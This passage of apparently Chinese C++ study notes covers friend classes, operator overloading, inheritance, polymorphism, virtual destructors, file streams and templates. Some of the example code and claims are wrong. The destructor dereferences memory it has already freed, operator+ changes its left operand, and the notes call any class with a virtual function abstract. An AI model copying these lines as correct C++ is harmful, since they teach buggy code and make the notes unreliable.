invite(&amp;p1);//正确</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>友元类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">class buiding</span><br><span class="line">&#123;</span><br><span class="line">   friend class person1;</span><br><span class="line">private:</span><br><span class="line">    string bedroom;</span><br><span class="line">public:</span><br><span class="line">    string livingroom;</span><br><span class="line">    buiding()</span><br><span class="line">    &#123;</span><br><span class="line">        livingroom = &quot;客厅&quot;;</span><br><span class="line">        bedroom =&quot;卧室&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">class person1</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    person1()</span><br><span class="line">    &#123;</span><br><span class="line">        this-&gt;buiding = new class buiding;</span><br><span class="line">    &#125;</span><br><span class="line">    void visit()</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;buiding-&gt;livingroom;</span><br><span class="line">        cout&lt;&lt;buiding-&gt;bedroom; // class person1被friend修饰</span><br><span class="line">    &#125;</span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">    buiding *buiding;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>函数重载之赋值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">class person</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">       int *age;</span><br><span class="line">       person(int age)</span><br><span class="line">       &#123;</span><br><span class="line">         this-&gt;age = new int(age);//因为age为指针类型，所以需要分配内存空间才能让指针指向该位置</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       //重载赋值</span><br><span class="line">      person&amp; operator=(person &amp;p)</span><br><span class="line">      &#123;</span><br><span class="line">           //首先判断当前对象的age是否有所指向的内存地址</span><br><span class="line">           if(this-&gt;age!=NULL)</span><br><span class="line">            &#123;</span><br><span class="line">                delete(this-&gt;age);</span><br><span class="line">                age=NULL;</span><br><span class="line">            &#125;</span><br><span class="line">          //深拷贝</span><br><span class="line">           this-&gt;age = new int (*p.age);</span><br><span class="line"></span><br><span class="line">           return *this;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">     //存在new关键字，需要手动释放内存</span><br><span class="line">     //析构函数</span><br><span class="line"></span><br><span class="line">     ~person()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">     if(this-&gt;age!=NULL)</span><br><span class="line">     &#123;</span><br><span class="line">       delete(this-&gt;age);</span><br><span class="line">       *this-&gt;age = NULL;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数重载之加(减类似)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class person &#123;</span><br><span class="line"> public:</span><br><span class="line">     int age;</span><br><span class="line">     person(int age)</span><br><span class="line">     &#123;</span><br><span class="line">         this-&gt;age = age;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     //重载加</span><br><span class="line">     person&amp; operator+(person &amp;p)</span><br><span class="line">     &#123;</span><br><span class="line">         this-&gt;age+=p.age;</span><br><span class="line">         return *this;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><p>函数重载之加加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">class person &#123;</span><br><span class="line"> public:</span><br><span class="line">     int age;</span><br><span class="line">     person(int age)</span><br><span class="line">     &#123;</span><br><span class="line">         this-&gt;age = age;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     //前置加加</span><br><span class="line">     person&amp; operator++()</span><br><span class="line">     &#123;</span><br><span class="line">         this-&gt;age++;</span><br><span class="line">         return *this;</span><br><span class="line">     &#125;</span><br><span class="line">     //后置加加,不能返回引用，因为tmp是局部变量，在返回之后就会销毁，若为引用则会报错</span><br><span class="line">     person operator++(int)</span><br><span class="line">     &#123;</span><br><span class="line">         person tmp = *this;</span><br><span class="line">         this-&gt;age++;</span><br><span class="line">         return tmp;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><p>函数重载之&lt;&lt;<br>&lt;&lt;重载无法再成员函数中实现，只能在全部函数中实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">class person &#123;</span><br><span class="line">public:</span><br><span class="line">    int age;</span><br><span class="line">    person(int age)</span><br><span class="line">    &#123;</span><br><span class="line">        this-&gt;age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //前置加加</span><br><span class="line">    person&amp; operator++()</span><br><span class="line">    &#123;</span><br><span class="line">        this-&gt;age++;</span><br><span class="line">        return *this;</span><br><span class="line">    &#125;</span><br><span class="line">    //后置加加,不能返回引用，因为tmp是局部变量，在返回之后就会销毁，若为引用则会报错</span><br><span class="line">    person operator++(int)</span><br><span class="line">    &#123;</span><br><span class="line">        person tmp = *this;</span><br><span class="line">        this-&gt;age++;</span><br><span class="line">        return tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ostream&amp; operator&lt;&lt;(ostream &amp;cout,person p)</span><br><span class="line">&#123;</span><br><span class="line">    cout&lt;&lt;p.age;</span><br><span class="line">    return cout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>重载关系运算符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">class person</span><br><span class="line">&#123;</span><br><span class="line">private:</span><br><span class="line">       int age;</span><br><span class="line">public:</span><br><span class="line">      person(int age)</span><br><span class="line">      &#123;</span><br><span class="line">       this-&gt;age = age;</span><br><span class="line">      &#125;</span><br><span class="line">      //重载关系运算符</span><br><span class="line"></span><br><span class="line">      bool operator==(person &amp;p)</span><br><span class="line">      &#123;</span><br><span class="line">           if(this-&gt;age==p.age)</span><br><span class="line">            &#123;</span><br><span class="line">               return true;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">               return false;</span><br><span class="line">            &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>c++面向对象之继承</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">class animal</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    void bark();</span><br><span class="line">    void eat();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class dog:public animal</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    void bark()</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout&lt;&lt;&quot;狗叫&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void  eat()</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout&lt;&lt;&quot;狗吃东西&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void jump()</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout&lt;&lt;&quot;狗跳&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>继承方式(public,protected,private)<br>使用public方式继承，子类可以访问父类中的public，protected属性及方法，但是不可访问private，并且继承之后的属性与方法为public<br>使用protected方式继承，子类可以访问父类中的public，protected属性及方法，但是不可访问private，并且继承之后的属性与方法为protected<br>使用private方式继承，子类可以访问父类中的public，protected属性及方法，但是不可访问private，并且继承之后的属性与方法为private<br>​<br>​<br>继承之后子类的对象模型<br>子类继承父类中所有的属性及方法，只是编译器将私有的属性隐藏，所以子类的大小为父类中所有属性加上子类中自己独有的属性<br>​<br>继承中先调用父类构造函数，在调用子类构造函数，析构函数则顺序相反<br>​<br>子类与父类中存在同名的方法与属性，要直接访问子类中的属性与方法则使用.<br>若要访问父类中的属性与方法需要加作用域：：<br>当子类与父类拥有同名的成员函数，子类会隐藏父类中的同名成员函数，加作用域可以访问到父类成员函数<br>​<br>​<br>继承同名静态成员处理方式<br>静态成员与非静态成员出现同名，处理方式一致<br>访问子类同名成员 直接访问即可<br>访问父类同名成员 需要加作用域<br>​<br>​<br><strong>多继承语言</strong><br><strong>子类：继承方式 父类，继承方式 父类，继承方式 父类……</strong><br><strong>​</strong><br><strong>​</strong><br><strong>菱形继承</strong><br><strong>利用虚继承 解决菱形继承问题</strong><br><strong>继承之前加上 关键字 virtual 变为虚继承</strong><br><strong>继承此类的类叫虚基类</strong><br><strong>​</strong><br>c++面向对象之多态<strong>多态分为两类</strong><br><strong>静态多态:函数重载 和 运算符重载属于静态多态，复用函数名</strong><br><strong>动态多态：派生类 和虚函数实现运行时多态</strong><br><strong>​</strong><br><strong>静态多态和动态多态区别：</strong><br><strong>静态多态的函数地址早绑定-编译阶段确定函数地址</strong><br><strong>动态多态的函数地址晚绑定-运行阶段确定函数地址</strong><br><strong>​</strong><br>多态</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">animal</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// friend  class dog;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dospeak</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;动物叫&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line"><span class="type">int</span> money;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> ps;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">dog</span>: <span class="keyword">public</span> animal</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dospeak</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;狗叫&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">say</span><span class="params">(animal &amp;animal)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    animal.<span class="built_in">dospeak</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    dog dog;</span><br><span class="line">    <span class="built_in">say</span>(dog); <span class="comment">//地址早绑定，会执行animal中的dospeak()</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>解决上述问题-使用动态多态，地址晚绑定</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">animal</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// friend  class dog;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">dospeak</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;动物叫&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line"><span class="type">int</span> money;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> ps;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">dog</span>: <span class="keyword">public</span> animal</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="function"><span class="type">void</span> <span class="title">dospeak</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;狗叫&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">say</span><span class="params">(animal &amp;animal)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    animal.<span class="built_in">dospeak</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  dog dog;</span><br><span class="line">  <span class="built_in">say</span>(dog);<span class="comment">//结果为狗叫</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>动态多态满足条件：</strong><br><strong>1.有继承关系</strong><br><strong>2.子类重写父类的虚函数</strong><br><strong>​</strong><br><strong>动态多态使用：</strong><br><strong>父类的指针或者引用 执行子类对象</strong><br><strong>​</strong><br><strong>纯虚函数和抽象类</strong><br><strong>virtual 返回值类型 函数名（参数列表）&#x3D;0；</strong><br><strong>当类中出现虚函数，这个类也称抽象类</strong><br><strong>​</strong><br><strong>抽象类特点</strong><br><strong>1.无法实例化对象</strong><br><strong>2.子类必须重写父类纯虚函数</strong><br><strong>​</strong><br><strong>​</strong><br><strong>虚析构</strong><br><strong>利用虚析构可以解决 父类指针释放子类对象时不干净的问题</strong><br><strong>virtual  ~person()</strong><br><strong>纯虚析构</strong><br><strong>virtual ~person() &#x3D;0;</strong><br><strong>有了纯虚析构之后，这个类也属于抽象类，无法实例化</strong><br>c++文件操作<strong>文本文件-文件以文本的ASCII码形式存储在计算机中</strong><br><strong>二进制文件-文件一文本的二进制形式存储在计算机中，用户一般不能直接读懂他们</strong><br><strong>​</strong><br><strong>操作文件的三大类</strong><br><strong>osftream :写操作</strong><br><strong>isftream :读操作</strong><br><strong>fstream：读写操作</strong><br><strong>​</strong><br><strong>文件打开方式：</strong><br><strong>ios::in  读文件</strong><br><strong>ios::out  写文件</strong><br><strong>ios::ate  初始位置：文件尾</strong><br><strong>ios::app  追加方式写文件</strong><br><strong>ios::trunc  如果文件存在先删除，在创建</strong><br><strong>ios::bina   二进制方式</strong><br><strong>​</strong><br>c++泛型编程<strong>c++提供两种模板机制 函数模板  类模板</strong><br><strong>​</strong><br><strong>函数模板语法</strong><br><strong>函数模板作用：</strong><br><strong>建立一个通用函数，其函数返回值类型和形参类型可以不具体指定，用一个虚拟的类型来代表</strong><br><strong>​</strong><br><strong>语法：</strong><br><strong>template<typename t></typename></strong><br><strong>函数声明或定义</strong></p><p>template —声明创建模板<br>​</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap1</span><span class="params">(T &amp;a,T &amp;b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    T tmp=a;</span><br><span class="line">    a=b;</span><br><span class="line">    b=tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">10</span>,b=<span class="number">20</span>;</span><br><span class="line">    <span class="built_in">swap1</span>&lt;<span class="type">int</span>&gt;(a,b); <span class="comment">//显示指定类型</span></span><br><span class="line">    <span class="built_in">swap1</span>(a,b);      <span class="comment">//自动类型推导</span></span><br><span class="line">    cout&lt;&lt;a&lt;&lt;b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>函数模板注意事项：</strong><br><strong>1.自动类型推导，必须推导出一致的数据类型T才可以使用</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="type">double</span>  b=<span class="number">20</span>;</span><br><span class="line"><span class="built_in">swap1</span>(a,b);<span class="comment">//错误，上面模板中形参的类型都是T，但是这里a为整型，b为double，不符合模板定义</span></span><br></pre></td></tr></table></figure><p><strong>2.模板必须要确定出T的数据类型，才可以使用</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;fun调用&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在创建模板时，模板函数中并没有T，但是在使用时需要显示加上类型，不然会出现错误</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fun</span>&lt;<span class="type">int</span>&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>使用模板对数组进行排序</strong><br>选择排序</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;  <span class="comment">//交换两个变量的值</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap1</span><span class="params">(T &amp;a,T &amp;b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    T tmp=a;</span><br><span class="line">    a=b;</span><br><span class="line">    b=tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sort</span><span class="params">(T array[],<span class="type">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;   <span class="type">int</span> a,tmp=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;length<span class="number">-1</span>;i++)</span><br><span class="line">    &#123;   a=array[i];</span><br><span class="line">        <span class="type">int</span> j=i+<span class="number">1</span>;</span><br><span class="line">        tmp=i;   <span class="comment">//这里要注意存在自身与自身交换的情况，若不加可能会出现选到的数一开始就是最小的</span></span><br><span class="line">                 <span class="comment">//但是tmp是上一次的索引值，本应该是自身与自身交换，结果确实与上一次的tmp交换发生错误</span></span><br><span class="line">        <span class="keyword">for</span>(;j&lt;length;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(array[j]&lt;a)</span><br><span class="line">            &#123;</span><br><span class="line">                a=array[j];</span><br><span class="line">                tmp=j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">swap1</span>(array[i],array[tmp]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>]=&#123;<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">sort</span>(a,<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>普通函数和模板函数的调用规则</strong><br>1.如果函数模板和普通函数都可以调用，优先调用普通函数<br>2.可以通过空模板参数列表强制调用 函数模板<br>3.函数模板可以发生函数重载<br>4.如果函数模板可以产生更好的匹配，优先调用函数模板<br>​<br>​<br><strong>类模板</strong><br><strong>类模板中 成员函数和普通类成员函数创建时机是有区别的：</strong><br><strong>普通类中的成员函数一开始就可以创建</strong><br><strong>类模板中的成员函数在调用时才创建</strong><br><strong>​</strong><br><strong>​</strong><br><strong>类模板对象做传递参数</strong><br><strong>1.指定传入的参数 –直接显示对象的数据类型</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T1</span>,<span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person3</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    T1 name;</span><br><span class="line">    T2 age;</span><br><span class="line">    <span class="built_in">Person3</span>(T1 name,T2 age)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;name=name;</span><br><span class="line">        <span class="keyword">this</span>-&gt;age=age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">showperson</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="keyword">this</span>-&gt;name&lt;&lt;<span class="keyword">this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print1</span><span class="params">(Person3&lt;string,<span class="type">int</span>&gt; 